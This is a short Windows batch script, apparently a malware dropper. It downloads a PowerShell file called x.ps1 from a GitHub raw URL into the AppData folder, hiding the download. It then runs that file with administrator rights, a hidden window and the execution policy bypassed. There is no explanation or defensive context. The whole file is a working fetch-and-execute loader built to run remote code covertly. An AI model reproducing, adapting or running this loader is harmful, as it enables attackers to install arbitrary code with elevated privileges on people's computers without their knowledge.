@echo off
set "URL=https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/x.ps1"
set "DEST=%AppData%\x.ps1"

:: Download the PS1 quietly
powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')"

:: Start the PS1 as Admin and Hidden
powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEST%""'"
exit